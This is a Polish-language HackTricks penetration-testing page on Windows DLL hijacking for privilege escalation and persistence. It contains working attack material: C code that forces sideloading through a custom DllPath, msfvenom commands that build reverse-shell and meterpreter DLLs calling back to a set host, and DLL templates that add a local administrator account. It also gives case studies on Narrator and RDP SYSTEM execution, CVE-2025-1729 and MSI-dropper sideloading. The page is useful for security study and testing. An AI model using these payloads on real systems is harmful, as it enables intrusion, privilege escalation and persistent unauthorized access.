# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji, aby załadowała złośliwą DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection, and Side-Loading**. Metoda jest wykorzystywana głównie do uruchamiania kodu, osiągania persistence oraz, rzadziej, privilege escalation. Mimo że tu skupiamy się na escalation, sposób hijackingu pozostaje taki sam niezależnie od celu.

### Typowe techniki

Stosuje się kilka metod DLL hijackingu, z różną skutecznością w zależności od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana oryginalnej DLL na złośliwą, opcjonalnie z użyciem DLL Proxying, aby zachować funkcjonalność oryginału.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej DLL w ścieżce wyszukiwania przed tą prawidłową, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej DLL, którą aplikacja załaduje, sądząc, że to wymagana, nieistniejąca DLL.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwej DLL.
5. **WinSxS DLL Replacement**: Zastąpienie prawidłowej DLL złośliwą kopią w katalogu WinSxS — metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej DLL w katalogu kontrolowanym przez użytkownika razem ze skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

## Znajdowanie brakujących DLL

Najbardziej powszechnym sposobem znalezienia brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals i ustawienie **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

oraz wyświetlenie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, pozostaw to działające przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, np. "Process Name" "contains" `<exec name>`, uruchom go i zatrzymaj przechwytywanie zdarzeń.

## Wykorzystywanie brakujących DLL

Aby przeprowadzić privilege escalation, najlepszą szansą jest możliwość zapisania DLL, którą proces z uprawnieniami spróbuje załadować w jednym z miejsc, gdzie będzie szukana. Możemy więc zapisać DLL w folderze, który jest przeszukiwany przed folderem zawierającym oryginalną DLL (rzadki przypadek), lub zapisać ją w folderze, w którym DLL będzie szukana, a oryginalna DLL nie istnieje w żadnym folderze.

### Kolejność wyszukiwania DLL

W dokumentacji [Microsoft](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) można znaleźć szczegóły dotyczące sposobu ładowania DLL.

Aplikacje Windows szukają DLL, korzystając z zestawu predefiniowanych ścieżek wyszukiwania, zachowując określoną kolejność. Problem DLL hijackingu pojawia się, gdy złośliwa DLL jest strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed autentyczną DLL. Rozwiązaniem jest zapewnienie, że aplikacja używa ścieżek absolutnych przy odwoływaniu się do wymaganych DLL.

Poniżej widać kolejność wyszukiwania DLL na systemach 32-bitowych:

1. Katalog, z którego została załadowana aplikacja.
2. Katalog systemowy. Użyj funkcji [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) aby otrzymać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie istnieje funkcja zwracająca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) aby otrzymać ścieżkę do tego katalogu.
1. (_C:\Windows_)
5. Katalog bieżący.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zwróć uwagę, że nie obejmuje to ścieżki per-aplikacja określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

To jest domyślna kolejność wyszukiwania przy włączonym SafeDllSearchMode. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode i ustaw ją na 0 (domyślnie włączone).

Jeżeli funkcja [LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z flagą **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który LoadLibraryEx ładuje.

Na koniec, zauważ że DLL może być załadowana wskazując absolutną ścieżkę zamiast samej nazwy. W takim przypadku ta DLL będzie szukana tylko w tej ścieżce (jeśli DLL ma zależności, będą one wyszukiwane tak, jakby były ładowane po nazwie).

Istnieją inne sposoby zmiany kolejności wyszukiwania, ale nie będę ich tu wyjaśniać.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu przy użyciu natywnych API ntdll. Podając tutaj katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowaną DLL po nazwie (bez ścieżki absolutnej i bez użycia flag bezpiecznego ładowania), może zostać zmuszony do załadowania złośliwej DLL z tego katalogu.

Główna idea
- Zbuduj parametry procesu przy pomocy RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na katalog kontrolowany przez Ciebie (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces przy pomocy RtlCreateUserProcess. Gdy binarka docelowa rozwiąże DLL po nazwie, loader skonsultuje się z dostarczonym DllPath podczas rozwiązywania, umożliwiając niezawodne sideloading nawet gdy złośliwa DLL nie znajduje się obok docelowego EXE.

Uwagi/ograniczenia
- To wpływa na tworzony proces potomny; różni się od SetDllDirectory, który wpływa tylko na bieżący proces.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez ścieżki absolutnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane ścieżki absolutne nie mogą być przechwycone. Forwarded exports i SxS mogą zmieniać priorytety.

Minimalny przykład w C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub pełniący rolę proxy dla oryginalnego) w katalogu DllPath.
- Uruchom podpisany plik binarny, który znany jest z wyszukiwania xmllite.dll po nazwie przy użyciu powyższej techniki. Ładowacz rozwiązuje import przez dostarczony DllPath i sideloads twoją DLL.

Zaobserwowano in-the-wild, że ta technika napędza wieloetapowe sideloading chains: początkowy launcher upuszcza pomocniczy DLL, który następnie uruchamia Microsoft-signed, hijackable binary z niestandardowym DllPath, aby wymusić załadowanie DLL atakującego z katalogu staging.


#### Wyjątki w kolejności wyszukiwania DLL według dokumentacji Windows

W dokumentacji Windows odnotowano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL, który ma taką samą nazwę jak inny już załadowany w pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego wykonuje sprawdzenie przekierowania i manifestu, zanim domyślnie użyje DLL już znajdującej się w pamięci. **W tym scenariuszu system nie przeprowadza wyszukiwania tej DLL**.
- W przypadkach, gdy DLL jest rozpoznawana jako **known DLL** dla aktualnej wersji Windows, system użyje swojej wersji tej known DLL wraz z jej zależnymi DLL-ami, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL jest przeprowadzane tak, jakby były one wskazane tylko przez ich **module names**, niezależnie od tego, czy początkowa DLL była podana przez pełną ścieżkę.

### Escalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działać z **innymi uprawnieniami** (ruch horyzontalny lub lateralny), któremu **brakuje DLL**.
- Upewnij się, że dostępne jest **write access** do dowolnego **katalogu**, w którym **będzie wyszukiwana DLL**. To miejsce może być katalogiem pliku wykonywalnego lub katalogiem w obrębie ścieżki systemowej.

Tak, wymagania są trudne do znalezienia, ponieważ **domyślnie dość rzadko zdarza się, że uprzywilejowany plik wykonywalny nie ma DLL**, a jeszcze **bardziej nietypowe jest posiadanie uprawnień zapisu w folderze na ścieżce systemowej** (domyślnie nie masz). Jednak w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest obejście UAC**, możesz tam znaleźć **PoC** Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia do zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich katalogów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego i eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik, jak **wykorzystać Dll Hijacking do eskalacji uprawnień** z uprawnieniami do zapisu w **System Path folder** sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w system PATH.\
Inne interesujące zautomatyzowane narzędzia do wykrywania tej podatności to **funkcje PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Przykład

Jeżeli znajdziesz podatny scenariusz, jedną z najważniejszych rzeczy, aby go pomyślnie wykorzystać, będzie **utworzenie dll, który eksportuje przynajmniej wszystkie funkcje, które plik wykonywalny zaimportuje z niego**. Zauważ, że Dll Hijacking jest przydatny do [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Możesz znaleźć przykład **jak stworzyć poprawny dll** w tym studium dotyczącym dll hijacking skoncentrowanym na dll hijacking dla wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Co więcej, w **następnej sekci**j możesz znaleźć kilka **podstawowych kodów dll** które mogą być użyteczne jako **szablony** lub do stworzenia **dll eksportującego nieobowiązkowe funkcje**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolny do **wykonywania twojego złośliwego kodu po załadowaniu**, ale także do **udostępniania** i **działania** zgodnie z **oczekiwaniami**, poprzez **przekazywanie wszystkich wywołań do rzeczywistej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proxify i **wygenerować proxified dll** lub **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

Zwróć uwagę, że w kilku przypadkach Dll, który skompilujesz, musi **export several functions**, które zostaną załadowane przez proces ofiary. Jeśli te functions nie istnieją, **binary won't be able to load** je i **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna DLL w C z punktem wejścia wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal sprawdza przewidywalny, specyficzny dla języka DLL lokalizacyjny podczas uruchamiania, który można przejąć w celu arbitrary code execution i persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC cisza
- Nieprzemyślany hijack spowoduje aktywację mowy/podświetlenia UI. Aby pozostać cicho, podczas attachu wylicz wątki Narrator, otwórz wątek główny (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` go; kontynuuj we własnym wątku. Zobacz PoC, aby uzyskać pełny kod.

Trigger and persistence via Accessibility configuration
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Z powyższym, uruchomienie Narrator załaduje zasadzoną DLL. Na bezpiecznym pulpicie (ekran logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator.

RDP-triggered SYSTEM execution (ruch boczny)
- Zezwól na klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się przez RDP z hostem, na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.
- Wykonanie zatrzymuje się po zamknięciu sesji RDP — przeprowadź inject/migrate niezwłocznie.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wbudowany wpis rejestru Accessibility Tool (AT) (np. CursorIndicator), edytować go, aby wskazywał na dowolny binary/DLL, zaimportować, a następnie ustawić `configuration` na tę nazwę AT. To zapewnia proxy dowolnego wykonania w ramach Accessibility.

Uwagi
- Zapisywanie w `%windir%\System32` i zmiana wartości HKLM wymaga uprawnień administratora.
- Cała logika payload może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten przypadek demonstruje Phantom DLL Hijacking w Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik, umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany w momencie wykonania zadania, złośliwy DLL uruchamia się w sesji administratora z medium integrity.
4. Zastosuj standardowe UAC bypass techniques, aby eskalować z medium integrity do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Aktorzy zagrożeń często łączą MSI-based droppers z DLL side-loading, aby uruchamiać payloads w kontekście zaufanego, podpisanego procesu.

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się cicho podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), odtwarzając kolejną fazę z osadzonych zasobów.
- Dropper zapisuje prawidłowy, podpisany EXE i złośliwy DLL w tym samym katalogu (przykładowa para: Avast-signed wsc_proxy.exe + controlled by attacker wsc.dll).
- Po uruchomieniu podpisanego EXE, kolejność wyszukiwania DLL w Windows ładuje wsc.dll z katalogu roboczego jako pierwszą, wykonując kod atakującego pod podpisanym procesem macierzystym (ATT&CK T1574.001).

Analiza MSI (na co zwracać uwagę)
- CustomAction table:
- Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiający osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence oraz Binary.
- Osadzone/podzielone payloads w MSI CAB:
- Administracyjne wyodrębnienie: msiexec /a package.msi /qb TARGETDIR=C:\out
- Albo użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez VBScript CustomAction. Typowy przepływ:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading przy użyciu wsc_proxy.exe
- Upuść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legitimate signed host (Avast). Proces próbuje załadować wsc.dll po nazwie z jego katalogu.
- wsc.dll: attacker DLL. Jeśli nie są wymagane konkretne eksporty, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- W przypadku wymagań eksportu użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, która także uruchamia twój payload.

- Technika ta polega na rozwiązywaniu nazw DLL przez binarkę hosta. Jeśli host używa ścieżek bezwzględnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS, oraz forwarded exports mogą wpływać na priorytet i muszą być uwzględnione podczas wyboru binarki hosta oraz zestawu eksportów.

## Referencje

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
